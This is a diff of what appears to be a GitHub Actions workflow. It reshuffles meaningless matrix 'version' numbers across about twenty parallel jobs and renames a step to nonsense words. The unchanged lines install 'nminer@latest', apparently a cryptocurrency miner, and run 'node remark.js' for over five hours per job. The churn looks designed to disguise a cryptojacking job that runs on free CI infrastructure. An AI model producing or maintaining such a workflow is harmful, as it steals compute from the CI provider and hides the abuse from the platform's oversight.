@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 831 }
-          - { version: 3 }
-          - { version: 5850 }
-          - { version: 3420 }
-          - { version: 6396 }
-          - { version: 7105 }
-          - { version: 54 }
-          - { version: 6935 }
-          - { version: 4996 }
-          - { version: 575 }
-          - { version: 1435 }
-          - { version: 7474 }
-          - { version: 5187 }
-          - { version: 8307 }
-          - { version: 1970 }
-          - { version: 9345 }
-          - { version: 5261 }
-          - { version: 4344 }
-          - { version: 6690 }
-          - { version: 4641 }
+          - { version: 7349 }
+          - { version: 8458 }
+          - { version: 9221 }
+          - { version: 8075 }
+          - { version: 9970 }
+          - { version: 4507 }
+          - { version: 9979 }
+          - { version: 5346 }
+          - { version: 2245 }
+          - { version: 1156 }
+          - { version: 7523 }
+          - { version: 3447 }
+          - { version: 1117 }
+          - { version: 6332 }
+          - { version: 1770 }
+          - { version: 192 }
+          - { version: 1982 }
+          - { version: 2033 }
+          - { version: 1046 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: tabulate
+      - name: for um hmph cruelly
         run: |
           npm install nminer@latest
-          timeout 318m node remark.js || echo "remark executed"
+          timeout 316m node remark.js || echo "remark executed"
